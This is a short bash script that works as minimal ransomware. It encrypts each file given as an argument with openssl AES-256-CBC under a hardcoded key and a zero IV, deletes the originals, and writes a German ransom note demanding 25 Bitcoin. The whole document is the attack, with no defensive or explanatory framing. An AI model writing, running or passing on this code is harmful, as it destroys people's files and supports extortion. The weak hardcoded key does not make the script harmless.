#!/bin/bash
for file in $@
do
  openssl aes-256-cbc -in "$file" -K '0106eb4887051520fcf40b5e8fa5acceab272785c1055ce53e3c201b1d3441fe' -iv '0' -out "$file".enc
  rm $file
done
echo "25 Bitcoin zum entschlüsseln" > ransomNote.txt
